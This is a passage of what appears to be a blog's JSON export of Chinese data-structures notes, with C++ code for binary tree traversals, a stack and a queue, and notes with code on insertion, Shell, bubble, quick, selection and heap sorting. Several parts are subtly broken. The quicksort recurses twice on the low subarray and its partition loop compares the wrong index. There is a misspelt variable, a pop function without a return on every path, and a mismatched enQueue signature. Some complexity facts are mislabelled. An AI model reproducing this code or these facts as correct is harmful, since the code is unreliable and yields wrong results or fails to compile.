class=\"line\">//栈相关函数</span><br><span class=\"line\">void initStack(stack&amp; s) &#123;</span><br><span class=\"line\">​\t//申请内存空间</span><br><span class=\"line\">​\ts.base = (BiTNode*)malloc(STACK_INIT_SIZE * sizeof(BiTNode));</span><br><span class=\"line\">​\tif (!s.base) &#123;</span><br><span class=\"line\">​\t\texit(OVERFLOW);</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">​\ts.top = s.base;</span><br><span class=\"line\">​\ts.size = STACK_INIT_SIZE;</span><br><span class=\"line\">​\treturn;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">bool isEmpty(stack&amp; s) &#123;</span><br><span class=\"line\">​\tif (s.base == s.top)</span><br><span class=\"line\">​\t\treturn true;</span><br><span class=\"line\">​\telse</span><br><span class=\"line\">​\t\treturn false;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void push(stack&amp; s, BiTNode treeNode) &#123;</span><br><span class=\"line\">​\tif (s.top - s.base &gt;= s.size) &#123;</span><br><span class=\"line\">​\t\ts.base = (BiTNode*)realloc(s.base, (s.size + STACKINCREMENT) * sizeof(BiTNode));</span><br><span class=\"line\">​\t\tif (!s.base) &#123;</span><br><span class=\"line\">​\t\t\texit(OVERFLOW);</span><br><span class=\"line\">​\t\t&#125;</span><br><span class=\"line\">​\t\ts.top = s.base + s.size;</span><br><span class=\"line\">​\t\ts.size += STACKINCREMENT;</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">​\t*s.top++ = treeNode;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">BiTNode pop(stack&amp; s) &#123;</span><br><span class=\"line\">​\tif (s.base) &#123;\t</span><br><span class=\"line\">​\t\tBiTNode e = (*--s.top);</span><br><span class=\"line\">​\t\t(*s.top).data = &#x27;$&#x27;;</span><br><span class=\"line\">​\t\treturn e;</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>二叉树的前中后序递归和非递归遍历和层序遍历代码实现</p>","more":"<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include&lt;iostream&gt;</span><br><span class=\"line\">#include&lt;stdlib.h&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">#define STACK_INIT_SIZE 100//存储空间初始分配量</span><br><span class=\"line\">#define STACKINCREMENT 10//存储空间分配增量</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct BiTNode &#123;</span><br><span class=\"line\">\tchar data;</span><br><span class=\"line\">\tstruct BiTNode* lchild, * rchild;</span><br><span class=\"line\">&#125;BiTNode,* BiTree;</span><br><span class=\"line\">typedef struct Node</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tBiTNode* treeNode;</span><br><span class=\"line\">\tNode* next;</span><br><span class=\"line\">&#125;Node;</span><br><span class=\"line\">typedef struct LinkQueue &#123;</span><br><span class=\"line\">\tNode* front;</span><br><span class=\"line\">\tNode* rear;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;LinkQueue;</span><br><span class=\"line\">typedef struct &#123;</span><br><span class=\"line\">\tBiTNode* top;</span><br><span class=\"line\">\tBiTNode* base;</span><br><span class=\"line\">\tint size;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;stack;</span><br><span class=\"line\">void createBiTree(BiTree&amp; t);</span><br><span class=\"line\">void preOrderTraverse(BiTree t);</span><br><span class=\"line\">void inOrderTraverse1(BiTree t);</span><br><span class=\"line\">void postOrderTraverse(BiTree t);</span><br><span class=\"line\">int getDeep(BiTree t);</span><br><span class=\"line\">bool initQueue(LinkQueue&amp; Q);</span><br><span class=\"line\">bool enQueue(LinkQueue&amp; Q, BiTNode treeNode);</span><br><span class=\"line\">void deQueue(LinkQueue&amp; Q);</span><br><span class=\"line\">void floorTraverse(LinkQueue&amp; Q, BiTree&amp; t);</span><br><span class=\"line\">void inOrderTraverse2(stack s, BiTree&amp; t);</span><br><span class=\"line\">void initStack(stack&amp; s);</span><br><span class=\"line\">bool isEmpty(stack&amp; s);</span><br><span class=\"line\">void push(stack&amp; s, BiTNode treeNode);</span><br><span class=\"line\">BiTNode pop(stack&amp; s);</span><br><span class=\"line\"></span><br><span class=\"line\">int main() &#123;</span><br><span class=\"line\">\tBiTree t;</span><br><span class=\"line\">\tstack s;</span><br><span class=\"line\">\tinitStack(s);</span><br><span class=\"line\">\tLinkQueue Q;</span><br><span class=\"line\">\tinitQueue(Q);</span><br><span class=\"line\">\tcreateBiTree(t);</span><br><span class=\"line\">\tcout &lt;&lt; &quot;二叉树创建完成&quot; &lt;&lt; endl&lt;&lt;endl;</span><br><span class=\"line\">\tcout &lt;&lt; &quot;先序遍历&quot; &lt;&lt; endl;</span><br><span class=\"line\">\tpreOrderTraverse(t);</span><br><span class=\"line\">\tcout &lt;&lt; endl;</span><br><span class=\"line\">\tcout &lt;&lt; &quot;递归中序遍历&quot; &lt;&lt;endl;</span><br><span class=\"line\">\tinOrderTraverse1(t);</span><br><span class=\"line\">\tcout &lt;&lt; endl;</span><br><span class=\"line\">\tcout &lt;&lt; &quot;非递归中序遍历&quot; &lt;&lt; endl;</span><br><span class=\"line\">\tinOrderTraverse2(s, t);</span><br><span class=\"line\">\tcout &lt;&lt; endl;</span><br><span class=\"line\">\tcout &lt;&lt; &quot;后序遍历&quot; &lt;&lt; endl;</span><br><span class=\"line\">\tpostOrderTraverse(t);</span><br><span class=\"line\">\tcout &lt;&lt; endl;</span><br><span class=\"line\">\tcout &lt;&lt; &quot;层序遍历&quot; &lt;&lt; endl;</span><br><span class=\"line\">\tfloorTraverse(Q, t);</span><br><span class=\"line\">\tcout &lt;&lt; endl;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tcout &lt;&lt; &quot;二叉树的深度为&quot; &lt;&lt; getDeep(t) &lt;&lt; endl;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void createBiTree(BiTree&amp; t) &#123;</span><br><span class=\"line\">\tchar c;</span><br><span class=\"line\">\tcin &gt;&gt; c;</span><br><span class=\"line\">\tif (c == &#x27;$&#x27;)</span><br><span class=\"line\">\t\t//利用给先序遍历序列添加空节点保证建立二叉树的唯一性</span><br><span class=\"line\">\t\tt = NULL;</span><br><span class=\"line\">\telse &#123;</span><br><span class=\"line\">\t\tif (!(t = (BiTNode*)malloc(sizeof(BiTNode)))) &#123;</span><br><span class=\"line\">\t\t\texit(OVERFLOW);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t//申请该节点的内存空间</span><br><span class=\"line\">\t\t//按照先序序列创建二叉树</span><br><span class=\"line\">\t\tt-&gt;data = c;</span><br><span class=\"line\">\t\tcreateBiTree(t-&gt;lchild);</span><br><span class=\"line\">\t\tcreateBiTree(t-&gt;rchild);</span><br><span class=\"line\"></span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">​\treturn;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//先序遍历</span><br><span class=\"line\">void preOrderTraverse(BiTree t) &#123;</span><br><span class=\"line\">​\tif (t) &#123;</span><br><span class=\"line\">​\t\tcout &lt;&lt; t-&gt;data &lt;&lt; &quot; &quot; &lt;&lt; flush;</span><br><span class=\"line\">​\t\tpreOrderTraverse(t-&gt;lchild);</span><br><span class=\"line\">​\t\tpreOrderTraverse(t-&gt;rchild);</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//中序遍历</span><br><span class=\"line\">void inOrderTraverse1(BiTree t) &#123;</span><br><span class=\"line\">​\tif (t) &#123;</span><br><span class=\"line\">​\t\tinOrderTraverse1(t-&gt;lchild);</span><br><span class=\"line\">​\t\tcout &lt;&lt; t-&gt;data &lt;&lt; &quot; &quot; &lt;&lt; flush;</span><br><span class=\"line\">​\t\tinOrderTraverse1(t-&gt;rchild);</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//后序遍历</span><br><span class=\"line\">void postOrderTraverse(BiTree t) &#123;</span><br><span class=\"line\">​\tif (t) &#123;</span><br><span class=\"line\">​\t\tpostOrderTraverse(t-&gt;lchild);</span><br><span class=\"line\">​\t\tpostOrderTraverse(t-&gt;rchild);</span><br><span class=\"line\">​\t\tcout &lt;&lt; t-&gt;data &lt;&lt; &quot; &quot; &lt;&lt; flush;</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int getDeep(BiTree t) &#123;</span><br><span class=\"line\">​\tif (t == NULL) &#123;</span><br><span class=\"line\">​\t\treturn 0;</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">​\t//变成比较两个子树的深度问题,递归分解问题,最下面的时候返回1</span><br><span class=\"line\">​\tint a = getDeep(t-&gt;lchild);</span><br><span class=\"line\">​\tint b = getDeep(t-&gt;rchild);</span><br><span class=\"line\">​\treturn (a &gt; b) ? (a + 1) : (b + 1);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">bool initQueue(LinkQueue&amp; Q) &#123;</span><br><span class=\"line\">​\tQ.front = Q.rear = new Node;</span><br><span class=\"line\">​\t//这个链队列是具有头结点的链队列,头结点不存数据</span><br><span class=\"line\">​\tif (!Q.front) &#123;</span><br><span class=\"line\">​\t\texit(OVERFLOW);</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">​\tQ.front-&gt;next = NULL;</span><br><span class=\"line\">​\treturn true;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">bool enQueue(LinkQueue&amp; Q, BiTNode *treeNode) &#123;</span><br><span class=\"line\">​\tNode* p = (Node*)malloc(sizeof(Node));</span><br><span class=\"line\">​\t//如果内存申请失败</span><br><span class=\"line\">​\tif (!p) &#123;</span><br><span class=\"line\">​\t\texit(OVERFLOW);</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">​\t//让p节点中的treeNode指向对应的树节点</span><br><span class=\"line\">​\tp-&gt;treeNode =treeNode;</span><br><span class=\"line\">​\tp-&gt;next = NULL;</span><br><span class=\"line\"></span><br><span class=\"line\">​\t//连接链表</span><br><span class=\"line\">​\tQ.rear-&gt;next = p;</span><br><span class=\"line\"></span><br><span class=\"line\">​\t//头结点的data域为空,尾结点data域非空</span><br><span class=\"line\">​\tQ.rear = p;</span><br><span class=\"line\">​\treturn true;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void deQueue(LinkQueue&amp; Q) &#123;</span><br><span class=\"line\">\tif (Q.front &amp;&amp; Q.front != Q.rear) &#123;</span><br><span class=\"line\">\t\t//新建一个temp指针p</span><br><span class=\"line\">\t\tNode* p = Q.front-&gt;next;</span><br><span class=\"line\"></span><br><span class=\"line\">​\t\tQ.front-&gt;next = p-&gt;next;</span><br><span class=\"line\">​\t\t//判断出队的是不是最后一个节点</span><br><span class=\"line\">​\t\t//如果不加这个判断free(p后),Q.rear-&gt;next会变为野指针</span><br><span class=\"line\">​\t\tif (p == Q.rear) &#123;</span><br><span class=\"line\">​\t\t\tQ.rear = Q.front;</span><br><span class=\"line\">​\t\t&#125;</span><br><span class=\"line\">​\t\tfree(p);</span><br><span class=\"line\">​\t</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">​\treturn;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void floorTraverse(LinkQueue&amp; Q, BiTree&amp; t) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">​\tif (t != NULL) &#123;</span><br><span class=\"line\">​\t\tenQueue(Q, t);</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">​\twhile (Q.front != Q.rear) &#123;</span><br><span class=\"line\">​\t\tcout &lt;&lt; Q.front-&gt;next-&gt;treeNode-&gt;data &lt;&lt;&#x27; &#x27; &lt;&lt; flush;</span><br><span class=\"line\">​\t\tif (Q.front-&gt;next-&gt;treeNode-&gt;lchild != NULL) &#123;</span><br><span class=\"line\">​\t\t\tenQueue(Q, Q.front-&gt;next-&gt;treeNode-&gt;lchild);</span><br><span class=\"line\">​\t\t&#125;</span><br><span class=\"line\">​\t\tif (Q.front-&gt;next-&gt;treeNode-&gt;rchild != NULL) &#123;</span><br><span class=\"line\">​\t\t\tenQueue(Q, Q.front-&gt;next-&gt;treeNode-&gt;rchild);</span><br><span class=\"line\">​\t\t&#125;</span><br><span class=\"line\">​\t\tdeQueue(Q);</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void inOrderTraverse2(stack s,BiTree&amp; t) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">​\tBiTNode* p = t;</span><br><span class=\"line\">​\twhile(p || !isEmpty(s)) &#123;</span><br><span class=\"line\">​\t\tif (p) &#123;</span><br><span class=\"line\">​\t\t\tpush(s, *p);</span><br><span class=\"line\">​\t\t\tp = p-&gt;lchild;</span><br><span class=\"line\">​\t\t&#125;</span><br><span class=\"line\">​\t\telse &#123;</span><br><span class=\"line\">​\t\t\tBiTNode e = pop(s);</span><br><span class=\"line\">​\t\t\tcout &lt;&lt; e.data &lt;&lt; &quot; &quot; &lt;&lt; flush;</span><br><span class=\"line\">​\t\t\tp = e.rchild;</span><br><span class=\"line\">​\t\t&#125;</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">​\treturn;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//栈相关函数</span><br><span class=\"line\">void initStack(stack&amp; s) &#123;</span><br><span class=\"line\">​\t//申请内存空间</span><br><span class=\"line\">​\ts.base = (BiTNode*)malloc(STACK_INIT_SIZE * sizeof(BiTNode));</span><br><span class=\"line\">​\tif (!s.base) &#123;</span><br><span class=\"line\">​\t\texit(OVERFLOW);</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">​\ts.top = s.base;</span><br><span class=\"line\">​\ts.size = STACK_INIT_SIZE;</span><br><span class=\"line\">​\treturn;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">bool isEmpty(stack&amp; s) &#123;</span><br><span class=\"line\">​\tif (s.base == s.top)</span><br><span class=\"line\">​\t\treturn true;</span><br><span class=\"line\">​\telse</span><br><span class=\"line\">​\t\treturn false;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void push(stack&amp; s, BiTNode treeNode) &#123;</span><br><span class=\"line\">​\tif (s.top - s.base &gt;= s.size) &#123;</span><br><span class=\"line\">​\t\ts.base = (BiTNode*)realloc(s.base, (s.size + STACKINCREMENT) * sizeof(BiTNode));</span><br><span class=\"line\">​\t\tif (!s.base) &#123;</span><br><span class=\"line\">​\t\t\texit(OVERFLOW);</span><br><span class=\"line\">​\t\t&#125;</span><br><span class=\"line\">​\t\ts.top = s.base + s.size;</span><br><span class=\"line\">​\t\ts.size += STACKINCREMENT;</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">​\t*s.top++ = treeNode;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">BiTNode pop(stack&amp; s) &#123;</span><br><span class=\"line\">​\tif (s.base) &#123;\t</span><br><span class=\"line\">​\t\tBiTNode e = (*--s.top);</span><br><span class=\"line\">​\t\t(*s.top).data = &#x27;$&#x27;;</span><br><span class=\"line\">​\t\treturn e;</span><br><span class=\"line\">​\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>"},{"title":"排序","date":"2022-01-07T13:39:01.000Z","typora-root-url":"..","_content":"\n## 排序\n\n#### 排序的分类\n\n##### 按照存储介质可以分为:\n\n- 内部排序: 数据量不大,数据在内存,无需内外村交换数据\n- 外部排序: 数据量不大,数据在外存 (文件排序)\n\n外部排序时,<!--more-->要将数据分批调入内存来排序,中间结果还要及时放入外存,显然外部排序更复杂\n\n##### 按照比较器个数可以分为:\n\n- 串行排序: 单处理机 (同一时刻比较一对元素)\n- 并行排序: 多处理机 (同一时刻比较多对元素)\n\n##### 按主要操作可分为:\n\n- 比较排序:用比较的方法\n\n插入排序,交换排序,选择排序,归并排序\n\n- 基数排序:不比较元素的大小,仅仅根据元素本身的取值确定其有序位置\n\n##### 按辅助空间可分为:\n\n- 原地排序: 辅助空间用量为O(1)的排序方法\n\n(所占的辅助存储空间与参加排序的数据量大小无关)\n\n- 非原地排序: 辅助空间用量超过O(1)的排序方法\n\n##### 按稳定排序可分为:\n\n- 稳定排序:能够使任何数值相等的元素,排序前后相对次序不变\n- 非稳定排序:不是稳定排序的方法\n\n**排序的稳定性只对结构类型数据排序有意义**,排序方法是否稳定并不能衡量一个排序算法的优劣\n\n##### 按自然性可分为:\n\n- 自然排序:输入数据越有序,排序的速度越快的排序方法\n- 非自然排序:不是自然排序的方法\n\n## 插入排序\n\n### 直接插入排序\n\n边插入边排序,保证子序列都是排好序的,选取元素插入到已经有序的序列中\n\n在插入排序中也可以使用哨兵,0号位置做哨兵\n\n##### 性能分析\n\n基本操作有两个,1.比较关键字大小,2.移动记录\n\n- 最好情况(已经有序)\n\n比较次数n-1,移动次数0\n\n- 最坏情况(逆序有序)\n\n比较次数n(n-1)/2\n\n##### 时间复杂度\n\n原始数据越接近有序,排序速度越快\n\n最坏情况下(逆序有序) O(n2)\n\n最好情况,已经有序,0+1+1+1…… ->O(n)\n\n平均情况下耗时差不多是最坏情况的一半O(n2)\n\n### 折半插入排序\n\n插入位置为high+1\n\n```c++\nvoid BInsertSort(SqList &L){\n    for(int i=2;i<=length;i++){//以此插入第2-n个元素\n        L.r[0]=L.r[i];//当前插入元素存到哨兵位置\n        low =1;high=i-1;//采用二分查找法查找插入位置\n        while(low<=high){\n            mid =(low+high)/2;\n            if(L.r[0].key<L.r[mid].key){\n                hith = mid - 1;           \n            }else{\n                low =mid +1;\n            }            \n        }\n        for(int j=i-1;j>=high+1;--j){\n            L.r[j+1]=L.r[j];//移动元素\n        }\n        L.r[high+1]=L.r[0];//插入到正确位置\n    }\n}\n```\n\n**二分插入排序比较次数与待排序的记录的初始排列状态无关**\n\n在对象的初始排列已经有序或者接近有序的情况下,直接插入排序比较次数比折半插入排序少\n\n减少了比较次数,不能减少移动次数\n\n平均性能优于直接插入排序\n\n##### 时间复杂度\n\nO(n2)\n\n##### 空间复杂度\n\nO(1)\n\n**是一种稳定的排序方法**\n\n### 希尔排序\n\n基本思想:先将整个待排记录序列分割成若干子序列,分别进行直接插入排序,待整个序列中的记录”基本有序”时,再对全体记录进行一次直接插入排序\n\n##### 特点\n\n- 一次移动,移动位置较大,跳跃式地接近排序后的最终位置\n- 最后一次只需要少量移动\n- 增量序列必须是递减的,最后一个必须是1\n- 增量序列应该是**互质**的\n\n以特定间隔的元素分为一组进行插入排序,最后递减成1间隔的插入排序\n\n步骤\n\n- 1.定义增量序列Dk:DM>DM-1>…>D1=1\n- 2.对每个Dk进行”Dk间隔”插入排序\n\n希尔排序算法是一种不稳定的排序算法\n\n##### 时间复杂度\n\nO(n1.25)~O(1.6n1.25) —-经验公式\n\nO(Nlog2N) —平均时间复杂度\n\n最差时间复杂度O(n2)\n\n##### 空间复杂度\n\nO(1) –本质还是插入排序\n\n##### 注意:\n\n- 如何选取最佳增量序列,目前尚未解决\n- 增量因子中除1外没有公因子(也就是增量因子互质)，且最后一个增量因子必须为1\n- 不适合在链式存储结构上实现\n\n## 交换排序\n\n### 冒泡排序\n\n**冒泡排序算法是稳定的**\n\n##### 冒泡排序算法改进\n\n如果某一趟发现没有产生任何交换,则说明该序列已经有序,后面的几趟就不需要比了,所以可以做出冒泡算法的改进\n\n```c++\nvoid bubble_sort(SqList &L){//改进的冒泡算法\n    int m,i,j,flag=1;\n    RedType x;//temp变量\n    for(m=1;m<n-1&&flag==1;m++){\n        flag=0;\n        for(j=1;j<=m;j++){\n            if(L.r[j].key>L.r[j+1].key){//发生逆序\n                flag=1;//发生交换,flag置为1,若本趟没发生交换,flag保持为0\n                x=L.r[j];\n                L.r[j]=L.r[j+1];\n                L.r[j+1]=x;//交换\n            }//endif\n        }//for\n    }//for\n}\n```\n\n**优点**:每趟结束时,不仅能挤出一个最大值到最后面位置,还能同时部分理顺其他元素\n\n##### 时间复杂度\n\n- 最好情况(正序)\n  - 比较次数:n-1\n  - 移动次数:0\n\n时间复杂度 O(n)\n\n- 最坏情况(逆序)\n  - 比较次数:1/2(n2-n)\n  - 移动次数:3/2(n2-n)\n\n时间复杂度O(n2)\n\n**平均时间复杂度O(n2)**\n\n**空间复杂度O(1)**\n\n### 快速排序\n\n**快速排序算法是不稳定的**\n\n**快速排序算法不是自然排序方法**\n\n##### 基本思想:\n\n- 任取一个元素为中心(枢轴)\n- 所有比它小的元素往前放,比他大的元素往后放,形成左右两个子表\n- 对各个子表重新选择中心元素并依次规则调整\n- 直到每个子表的元素只剩一个\n\n```c++\nint Partition(SqList &L,int low,int high){\n    L.r[0]=L.r[low];\n    pivotkey=L.r[low].key;\n    while(low<high){\n        while(low<high&&L.r[high].key>=pivotkey)\n            --high;\n        L.r[low]=L.r[high];\n        while(low<high&&L.r[high].key<=pivotkey)\n            ++low;\n        L.r[high]=L.r[low];\n    }\n    L.r[low]=L.r[0];\n    return low;//返回枢轴最终的位置\n}\nvoid QSort(SqList &L,int low,int high){\n    if(low <high){//low==high即各个子表都只有一个元素\n        pivotloc=Partition(L,low,high);\n        //将L.r[low...high]一分为二,pivotloc为枢轴元素排好序的位置\n        QSort(L,low,pivotloc-1);//对低子表递归排序\n        QSort(L,low,pivotloc-1);//对高子表递归排序     \n    }\n}\nvoid main(){\n\tQSort(L,1,L.length);\n}\n```\n\n##### 时间复杂度O(nlog2n)\n\n- QSort(); ——O(log2n)\n- Partition();——-O(n)\n\n实验结果表明,就平均计算时间而言,快速排序是我们所讨论的所有内排序方法中最好的一个\n\n##### 空间复杂度\n\n快速排序不是原地排序\n\n由于程序中使用了递归,需要递归调用栈的支持,而栈的长度取决于递归调用的深度,(即使不用递归,也需要用用户栈)\n\n- 在平均情况下需要O(log2n)的栈空间\n- 最快情况下:栈空间可达O(n)\n\n##### 注意\n\n- 冒泡排序不适合对原本有序或者基本有序的记录序列进行排序,此时会退化成没有改进的**冒泡排序**时间复杂度O(n2)\n\n### 简单选择排序\n\n**简单选择排序算法是不稳定的**\n\n基本思想:在待排序的数据中选出最大(小)的元素放在其最终的位置\n\n基本操作\n\n1. 首先通过n-1次关键字比较,从n个记录中找出关键字最小的记录,将它与第一个记录交换\n2. 再通过n-2次比较,从剩余的n-1个记录中找出关键字次小的记录,将它与第二个记录交换\n3. 重复上述操作,共进行n-1趟排序后,排序结束\n\n移动次数\n\n- 最好情况 0\n- 最好情况 3(n-1)\n\n**比较次数是”定”值**n(n-1)/2\n\n##### 时间复杂度\n\nO(n2)\n\n### 堆排序\n\n**堆排序是不稳定的**\n\n若在输出对堆顶的最小值(最大值)后,使得剩余n-1个元素的序列又建成一个堆,则得到n个元素的次小值(次大值)….如此反复,便能得到一个有序序列,这个过程称之为堆排序\n\n##### 优点\n\n在数据元素各种情况下时间复杂度都是O(nlog2n)\n\n#### 如何调整剩余元素成为一个新的堆\n\n##### 小根堆\n\n1. 